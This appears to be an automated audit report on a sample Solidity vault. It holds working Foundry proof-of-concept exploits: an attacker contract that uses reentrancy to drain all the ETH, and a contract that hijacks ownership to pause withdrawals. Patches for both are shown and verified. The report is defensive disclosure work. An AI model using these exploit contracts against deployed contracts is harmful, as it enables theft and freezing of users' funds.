# ProofBox report: sample:vuln-vault

Job `3dabf61ceb4844b1` · state **done** · 2 proven findings · 2 verified fixes · 0 attacks contained · 0 commands denied by policy

Two exploits were proven with Foundry inside an offline sandbox: a reentrancy in withdraw that let a 1 ETH attacker take all 11 ETH, and an unguarded setOwner that lets anyone pause the vault. The first reentrancy proof failed, the agent read the revert, fixed the exploit and proved it on the second try. Both bugs got patches that were verified in the sandbox: the exploits now revert and the original test suite still passes.

## F1 · Reentrancy drains the vault

**Severity:** critical · **Where:** `src/EtherVault.sol:30` · **Proof attempts:** 2

withdraw makes the external call before setting the balance to zero, so an attacker contract re enters and takes every depositor's ETH.

**Proof** `forge test --offline --match-path test/ProofReentrancy.t.sol -vv` (exit 0, 0.39s)

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {EtherVault} from "../src/EtherVault.sol";

interface Vm { function deal(address who, uint256 amount) external; }

contract Attacker {
    EtherVault public vault;
    constructor(EtherVault v) { vault = v; }
    function attack() external payable { vault.deposit{value: msg.value}(); vault.withdraw(); }
    receive() external payable { if (address(vault).balance >= 1 ether) vault.withdraw(); }
}

contract ProofReentrancy {
    Vm constant vm = Vm(0x7109709ECfa91a80626fF3989D68f67F5b1DD12D);
    receive() external payable {}

    function test_PROOFBOX_CONFIRMED_reentrancy_drains_vault() public {
        EtherVault vault = new EtherVault();
        vm.deal(address(this), 11 ether);
        vault.deposit{value: 10 ether}();          // honest users
        Attacker a = new Attacker(vault);
        a.attack{value: 1 ether}();                 // attacker puts in 1
        require(address(vault).balance == 0, "vault not drained");
        require(address(a).balance == 11 ether, "attacker did not profit");
    }
}
```

<details><summary>Sandbox output</summary>

```
Compiling 1 files with Solc 0.8.26
Solc 0.8.26 finished in 23.09ms
Compiler run successful!

Ran 1 test for test/ProofReentrancy.t.sol:ProofReentrancy
[PASS] test_PROOFBOX_CONFIRMED_reentrancy_drains_vault() (gas: 943845)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 537.45µs (298.11µs CPU time)

Ran 1 test suite in 2.29ms (537.45µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
</details>

**Fix (verified):** Move the balance reset above the external call (checks effects interactions).

```diff
--- a/src/EtherVault.sol
+++ b/src/EtherVault.sol
@@ -26,10 +26,10 @@
         uint256 amount = balances[msg.sender];
         require(amount > 0, "nothing to withdraw");
 
+        balances[msg.sender] = 0;
+
         (bool ok, ) = msg.sender.call{value: amount}("");
         require(ok, "transfer failed");
-
-        balances[msg.sender] = 0;
         emit Withdraw(msg.sender, amount);
     }
```

Proof after fix: exit 1 (bug gone). Repo tests after fix: exit 0.

## F2 · Anyone can take ownership and freeze funds

**Severity:** high · **Where:** `src/EtherVault.sol:37` · **Proof attempts:** 1

setOwner has no onlyOwner check, so any address can make itself owner and pause withdrawals for every user.

**Proof** `forge test --offline --match-path test/ProofOwner.t.sol -vv` (exit 0, 0.12s)

```
// SPDX-License-Identifier: MIT
pragma solidity ^0.8.20;

import {EtherVault} from "../src/EtherVault.sol";

contract Stranger {
    function hijack(EtherVault v) external { v.setOwner(address(this)); v.setPaused(true); }
}

contract ProofOwner {
    function test_PROOFBOX_CONFIRMED_stranger_takes_owner_and_pauses() public {
        EtherVault vault = new EtherVault();
        Stranger s = new Stranger();
        s.hijack(vault);
        require(vault.owner() == address(s), "owner unchanged");
        require(vault.paused(), "not paused");
    }
}
```

<details><summary>Sandbox output</summary>

```
Compiling 2 files with Solc 0.8.26
Solc 0.8.26 finished in 23.72ms
Compiler run successful!

Ran 1 test for test/ProofOwner.t.sol:ProofOwner
[PASS] test_PROOFBOX_CONFIRMED_stranger_takes_owner_and_pauses() (gas: 720384)
Suite result: ok. 1 passed; 0 failed; 0 skipped; finished in 913.78µs (145.02µs CPU time)

Ran 1 test suite in 1.76ms (913.78µs CPU time): 1 tests passed, 0 failed, 0 skipped (1 total tests)
```
</details>

**Fix (verified):** Require msg.sender to be the current owner in setOwner.

```diff
--- a/src/EtherVault.sol
+++ b/src/EtherVault.sol
@@ -34,6 +34,7 @@
     }
 
     function setOwner(address newOwner) external {
+        require(msg.sender == owner, "not owner");
         owner = newOwner;
     }
```

Proof after fix: exit 1 (bug gone). Repo tests after fix: exit 0.

## Audit trail

- Events: 34
- Chain valid: True
- Head hash: `eaa0f9cdae66f947d6f289fd5f936be6010257aac15784f8b0b719fb23d349bc`
- Server signature (HMAC SHA256 of head): `a37aa5809f7b850cbd36f632a753214727e32f2c7240f63a21dfcd9485b3314f`
